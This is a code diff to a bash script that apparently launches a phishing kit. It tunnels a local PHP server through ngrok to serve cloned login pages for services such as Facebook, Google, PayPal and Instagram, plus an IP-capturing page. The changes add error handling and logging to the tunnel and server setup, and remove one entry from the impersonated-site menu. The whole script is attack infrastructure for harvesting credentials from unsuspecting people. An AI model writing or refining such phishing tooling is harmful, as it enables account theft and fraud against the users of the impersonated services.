@@ -234,7 +234,11 @@ install_ngrok() {
 start_ngrok() {
 	ngrok http 80 > /dev/null &
 	NGROK_URL=$(curl -s http://127.0.0.1:4040/api/tunnels | jq -r '.tunnels[0].public_url')
-	echo "Ngrok URL: $NGROK_URL"
+	if [[ -z "$NGROK_URL" ]]; then
+		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Failed to get ngrok URL. Ensure ngrok is installed and running."
+		{ reset_color; exit 1; }
+	fi
+	echo "Ngrok URL: $NGROK_URL" | tee -a .server/ngrok.log
 }
 
 ## Setup website and start php server
@@ -244,6 +248,11 @@ setup_site() {
 	cp -f .sites/ip.php .server/www/
 	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
 	cd .server/www && php -S 0.0.0.0:80 > /dev/null 2>&1 &
+	if [[ $? -ne 0 ]]; then
+		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Failed to start PHP server. Ensure PHP is installed and the port is available."
+		{ reset_color; exit 1; }
+	fi
+	echo "PHP server started on http://$HOST:$PORT" | tee -a .server/php.log
 }
 
 ## Get IP address
@@ -295,7 +304,6 @@ main_menu() {
 		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}11${RED}]${ORANGE} Twitch       ${RED}[${WHITE}21${RED}]${ORANGE} DeviantArt
 		${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}12${RED}]${ORANGE} Pinterest    ${RED}[${WHITE}22${RED}]${ORANGE} Badoo
 		${RED}[${WHITE}03${RED}]${ORANGE} Google        ${RED}[${WHITE}13${RED}]${ORANGE} Snapchat     ${RED}[${WHITE}23${RED}]${ORANGE} Origin
-		${RED}[${WHITE}04${RED}]${ORANGE} Microsoft     ${RED}[${WHITE}14${RED}]${ORANGE} Linkedin     ${RED}[${WHITE}24${RED}]${ORANGE} DropBox
 		${RED}[${WHITE}05${RED}]${ORANGE} Netflix       ${RED}[${WHITE}15${RED}]${ORANGE} Ebay         ${RED}[${WHITE}25${RED}]${ORANGE} Yahoo
 		${RED}[${WHITE}06${RED}]${ORANGE} Paypal        ${RED}[${WHITE}16${RED}]${ORANGE} Quora        ${RED}[${WHITE}26${RED}]${ORANGE} Wordpress
 		${RED}[${WHITE}07${RED}]${ORANGE} Steam         ${RED}[${WHITE}17${RED}]${ORANGE} Protonmail   ${RED}[${WHITE}27${RED}]${ORANGE} Yandex
